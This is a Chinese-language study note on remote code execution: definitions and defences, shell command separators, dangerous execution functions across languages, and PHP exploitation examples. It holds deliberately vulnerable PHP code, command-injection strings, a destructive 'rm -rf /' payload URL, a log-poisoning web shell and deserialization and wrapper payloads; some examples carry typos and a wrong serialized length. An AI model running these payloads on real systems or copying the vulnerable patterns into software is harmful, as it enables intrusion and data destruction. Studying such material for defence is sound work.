# RCE漏洞简介

RCE（Remote Code Execution，远程代码执行）漏洞是一种严重的安全漏洞，允许攻击者从远程位置在目标系统上执行任意代码。

## 基本概念

RCE漏洞使攻击者能够：

- 在受害系统上运行命令或程序
    
- 通常会导致完全控制系统
    
- 可能被用来安装恶意软件、窃取数据或创建后门
    

## 常见类型

1. **输入验证不足**：未对用户输入进行适当过滤
    
2. **反序列化漏洞**：处理序列化数据时的不安全操作
    
3. **命令注入**：系统命令中直接使用未经验证的用户输入
    
4. **缓冲区溢出**：通过覆盖内存执行任意代码
    

## 典型危害

- 系统完全沦陷
    
- 数据泄露或篡改
    
- 作为跳板攻击内网其他系统
    
- 植入勒索软件或挖矿程序
    

## 防护措施

1. 对所有输入进行严格验证和过滤
    
2. 使用参数化查询代替字符串拼接
    
3. 实施最小权限原则
    
4. 及时更新和打补丁
    
5. 使用Web应用防火墙(WAF)

# 命令分割符
- & **(后台执行）**
	-  -**不关心命令是否成功**，直接执行下一个命令。在 **Linux/Unix** 中：将命令放到后台执行，不阻塞当前终端。
	- sleep 10 &  # 后台运行sleep，终端可继续输入其他命令
- &&**(逻辑与)**
	- - **只有前一个命令成功（返回退出码`0`）时，才执行下一个命令**。
	- mkdir test && cd test  # 只有mkdir成功时，才会执行cd
- |**（管道）**
	- 将前一个命令的 **标准输出（stdout）** 作为后一个命令的 **标准输入（stdin）**。
	- **不检查命令是否成功**，仅传递数据。
	- cat file.txt | grep "keyword"  # 将cat的输出传递给grep
- ||**（逻辑或）**
	- **只有前一个命令失败（返回非`0`退出码）时，才执行下一个命令**。
	- 用于错误处理或回退操作。命令1正确只执行命令1，错误执行命令2
	- rm file.txt || echo "删除失败"  # 如果rm失败，则打印消息
- ``
	- 当一个命令被解析时，它首先会执行反引号之间的操作。例如执行echo`ls-a` 将会首先执行ls并捕获其输出信息。然后再将它传递给echo，并将ls的输出结果

# 不同系统中的特殊符号（没区别基本除了linux有一个;）
windows中特殊符合
|           直接执行后面的语句	                                                                ping 127.0.0.1lwhoami
||          前面出错执行后面的,需要前面的语句为假	                                ping 2 || whoami
&         whoami前面的语句为假则直接执行后面的,前面可真可假	        ping 127.0.0.1&whoami
&&      前面的语句为假则直接出错，后面的也不执行，前面 必须为真  ping 127.0.0.1&&whoami

Linux中的特殊符号：	
;           前面的执行完执行后面的	                                                         ping 127.0.0.1 ; whoami
|           管道符，显示后面的执行结果                                                     ping 127.0.0.1 l whoami
||          当前面的执行出错时执行后面的	                                                 ping 1 ll whoami
&         前面的语句为假则直接执行后面的,前面可真可假	                   ping 127.0.0.1 & whoami
&&      前面的语句为假则直接出错，后面的也不执行，前面只能为真	ping 127.0.0.1 && whoami

# 不同编程语言中可能导致RCE漏洞的命令执行函数

以下是各种编程语言中常见的危险函数，如果使用不当（如直接拼接用户输入），可能导致远程代码执行（RCE）漏洞：
```
## 1. PHP
system() //返回字符串
passthru() //与passthru()几乎相同，返回字符串
上面两函数无需借助输出函数即可输出内容
exec() //返回数组， 需要借助输出函数，如果有第二个参数就是输出整个数组，没有的话则返回数组最后一个元素
shell_exec() //输出字符串，需要借助输出函数
backtick运算符 (``)反引号 `需要执行的命令` //输出需借助输出函数

popen()与proc_open() 不会直接返回执行结果，而是返回一个文件指针(通过文件指针可以对所指文件进行各种操作，例如写，读操作)
<?php popen('whoami' >> D:/2.txt,'r') ;?>系统执行whoami并将内容追加到D:/2.txt中
	>>为追加操作，>为覆盖	
eval() // 代码执行而非命令执行，但同样危险
${phpinfo()}
assert()

## 2. Python
os.system()
os.popen()
subprocess.run() // 如果shell=True且未正确转义
subprocess.Popen() // 同上
eval() // 代码执行，当作php代码执行
pickle.loads() // 反序列化可能导致RCE

## 3. Java
Runtime.getRuntime().exec()
ProcessBuilder()
ScriptEngine.eval() // 代码执行
ObjectInputStream.readObject() // 反序列化

## 4. JavaScript/Node.js
child_process.exec()
child_process.execSync()
child_process.spawn()
eval()
Function()构造函数
vm.runInThisContext()

## 5. C/C++
system()
popen()
exec()家族函数(execve, execl等)

## 6. .NET (C#/VB.NET)
System.Diagnostics.Process.Start()
new System.Diagnostics.ProcessStartInfo()
System.CodeDom.Compiler
DynamicMethod

## 7. Ruby
`command` // 反引号
system()
exec()
spawn()
eval()
Open3.popen3()

## 8. Perl
system()
exec()
`command` // 反引号
open() // 如果用于执行命令
eval()

## 9. Go
os/exec.Command()
syscall.Exec()
text/template 或 html/template 的不安全使用

## 10. Bash/Shell
eval
command substitution (` ` 或 $())
source/. (点命令)
```

# PHP中RCE漏洞利用示例
## 1. 直接命令注入

### 危险函数使用
```php
<?php
// 示例1：system()函数直接执行用户输入
$cmd = $_GET['cmd'];
system($cmd);

// 示例2：反引号执行
$output = `$_GET['cmd']`;

// 示例3：exec()函数
exec($_POST['command'], $output);
?>
```
**利用方式**：
```
http://example.com/vuln.php?cmd=id
http://example.com/vuln.php?cmd=rm+-rf+/
```

## 文件包含导致的RCE
### 本地文件包含(LFI)转RCE
```php
<?php
include($_GET['page'] . '.php');
?>
```
**利用方式**：
1. 先上传含PHP代码的文件到服务器
2. 然后包含该文件：
```
http://example.com/vuln.php?page=/var/www/uploads/malicious
```
### 日志注入
```
http://example.com/vuln.php?page=/var/log/apache2/access.log
```
然后在User-Agent中注入PHP代码：
```
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```
## 3. 反序列化漏洞
### 不安全反序列化
```php
<?php
class Example {
    public $cmd = "whoami";
    
    public function __destruct() {
        system($this->cmd);
    }
}

unserialize($_GET['data']);
?>
```
**利用方式**：  
构造恶意序列化数据：
```
$payload = serialize(new Example());
echo urlencode($payload);
```
然后访问：
```
http://example.com/vuln.php?data=O:7:"Example":1:{s:3:"cmd";s:17:"echo+pwned+>/tmp/pwned";}
```
## 4. 动态函数执行

### 危险动态函数调用
```php
<?php
$func = $_GET['func'];
$arg = $_GET['arg'];
$func($arg);
?>
```
**利用方式**：
```
http://example.com/vuln.php?func=system&arg=id
```
## 5. preg_replace的/e修饰符
```php
<?php
preg_replace("/.*/e", $_GET['code'], "");
?>
```
**利用方式**：
```
http://example.com/vuln.php?code=system("id")
```
## 6. 文件上传+包含组合
1. 上传含PHP代码的文件（绕过检查）
2. 访问上传的文件执行代码
**示例上传文件内容**：
```
<?php system($_GET['cmd']); ?>
```
## 7. PHP包装器利用
### data协议
```
http://example.com/vuln.php?page=data://text/plain,<?php system("id");?>
```
## 8. 环境变量注入
```php
<?php
putenv("MYVAR=" . $_GET['var']);
system('echo $MYVAR');
?>
```
**利用方式**：
```
http://example.com/vuln.php?var=;id
```